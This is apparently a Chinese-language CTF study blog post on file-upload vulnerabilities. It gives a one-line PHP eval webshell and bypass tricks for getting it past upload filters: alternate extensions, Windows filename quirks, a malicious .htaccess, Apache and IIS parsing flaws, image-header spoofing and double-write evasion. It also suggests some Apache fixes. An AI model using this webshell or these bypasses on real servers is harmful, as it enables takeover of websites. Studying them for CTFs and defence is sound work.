---
title: 文件上传
date: 2023-09-27 09:32:01
tags:
categories:
  - [ctf-web]
  - [渗透]
---
# 文件上传

## 文件上传漏洞概述

| 值                                | 描述                                                         |
| --------------------------------- | ------------------------------------------------------------ |
| application/x-www-form-urlencoded | 默认，在发送前对所有字符进行编码（将空格转换成”+“符号，特殊字符转成ASCII HEX值）。将表单中的数据变为键值对的形式如果action为get，则将表单中的数据转换成一个字符串(name1=value1&name2=value2)，然后把这个字符串附加到URL后面，并用?分割如果action为post，浏览器把form数据封装到http body中，然后发送到服务器 |
| multipart/form-data               | 不对字符编码。当表单中有**文件上传**控件时该值是必须的。专门用来传输特殊类型数据的，比如文件，会将表单中的数据变成二进制数据，这时候如果用request是无法获取到相应表单的值，应通过**stream流**对象，将传到服务器端的二进制数据解码，从而读取数据 |
| text/plain                        | 将空格转换成”+“符号，但不编码特殊字符。表单以纯文本形式进行编码 |

### webshell

webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。

最普遍的一句：

```php
<?php @eval($_POST['shell']);?>
```

其中eval就是执行命令的函数，$_POST[‘shell’]就是接收的数据。eval函数把接收的数据当作php代码来执行。这样我们就能够让插了一句话木马的网站执行我们传递过去的任意php语句。这便是一句话木马的强大之处。

## 文件上传检测与绕过

### 前端检测与绕过

burp抓包改文件名

### 服务端检测与绕过

#### 后缀名检测与绕过

1. 黑名单列表绕过

如果黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。

不同后缀：Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml

也可尝试大小写绕过：

windows对大小写不敏感，linux对大小写敏感

2. windows特性

windows会自动去掉后面添加的

```
1.php.

1.php (空格)

1.php::$DATA
```

3. .htaccess文件攻击

原理： 

- .htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。**管理员可以通过 Apache 的 AllowOverride 指令来设置**（该参数在httpd.conf中进行设置）。 
- htaccess 中有 # 单行注释符, 且支持 \拼接上下两行

以下为匹配文件名的方法

```.htaccess
<FilesMatch "1.jpg">    
	SetHandler application/x-httpd-php 
</FilesMatch>
```

4. 结合apache文件解析机制，从右到左开始解析文件后缀，若文件名不可识别，则继续判断直到遇到可解析的后缀为止。

`1.php.xxx`

其实,apache本身根本不存在所谓的解析漏洞.
我们回顾一下请求的过程（1.php.xxx.yyy）:
yyy ->无法识别,向左
xxx ->无法识别,向左
php ->发现后缀是php，交给php处理这个文件
最后一步虽然交给了php来处理这个文件，但是php也不认识.yyy的后缀啊，所以就直接输出了。

解析漏洞的产生，是由于运维人员在配置服务器时，为了使apache服务器能解析php，而自己添加一个handler，例如：

```
AddHandler application/x-httpd-php.php
```

它的作用也是为了让apache把php文件交给phpmodule解析，但是注意到它与SetHandler:它的后缀不是用正则去匹配的。所以,在文件名的任何位置匹配到php后缀，它都会让php_module解析。

修复方法
不要使用AddHandler,改用SetHandler,写好正则,就不会有解析问题，

```
<FilesMatch ".+ \.php$">
SetHandler application/x-httpd-php
</FilesMatch>
禁止.php.这样的文件执行，
<FilesMatch".+\.ph(p[3457]?|t|tml)\.">
Require all denied
</FilesMatch>
```



5. IIS解析漏洞

**IlS 6.0**在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这—漏洞有两种完全不同的利用方式:
/test.asp/test.jpg
test.asp;.jpg

#### MIME类型检测与绕过

Content-Type字段表示文件的MIME类型。

注意该字段的值即可。

#### 文件内容检测与绕过

一个方法是：上传一张图片，然后在尾部加上一句话木马（同样使用burpsuite）。问题:在传入一张正常图片，然后在burp里面拦截并尾部加上一句话木马后，显示上传成功，但是却无法读取，在前端访问显示error；最后删去了很长一段图片内容，再次上传，可以成功连接；

还有一方法为直接制作图片马：

```bash
$ copy 1.jpg/b +1.php/a 2.jpg
```

实验：

将上传的一句话木马文件改名绕过前端：

muma.php--->muma.jpeg

![image-20230922102923688](https://s2.loli.net/2023/09/22/gpfAxnuyeXzh32j.png)

burp抓包，改回php后缀名，并且加上GIF89a(gif的文件头)

![image-20230922102655658](https://s2.loli.net/2023/09/22/2glOqDAMapuYI4P.png)

但是试了GIF8, 也可以上传成功

![image-20230922111052350](https://s2.loli.net/2023/09/22/3vlMOEcDTFUymb5.png)

![image-20230922111145578](https://s2.loli.net/2023/10/26/mnCRELWgDAZNO5d.png)

GIF8---47494638  已经是文件头了 

常见图片文件头：

| 文件类型 | 后缀       | 文件头   | 文件尾   | 标志          |
| -------- | ---------- | -------- | -------- | ------------- |
| JPEG     | .jpg/.jpeg | FFD8FF   | FFD9     | JFIF          |
| PNG      | .png       | 89504E47 | AE426082 | PNG IEND IHDR |
| GIF      | .gif       | 47494638 | 003B     | GIT9a         |
| TIFF     | .tif/.tiff | 49492A00 | 4D4D2A00 | - II MM       |

#### 00截断检测与绕过

截断条件：php版本小于5.3.4

#### 双写绕过

以下为示例检测代码：

```
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);
//code from ctfhub
```

#### 条件竞争检测与绕过

略

## 参考链接

https://www.cnblogs.com/linfangnan/p/15784968.html

![2fc0902942b46dcad0a5b6a23f693363](https://s2.loli.net/2023/10/26/7fsbOxUGq4yHjwV.png)

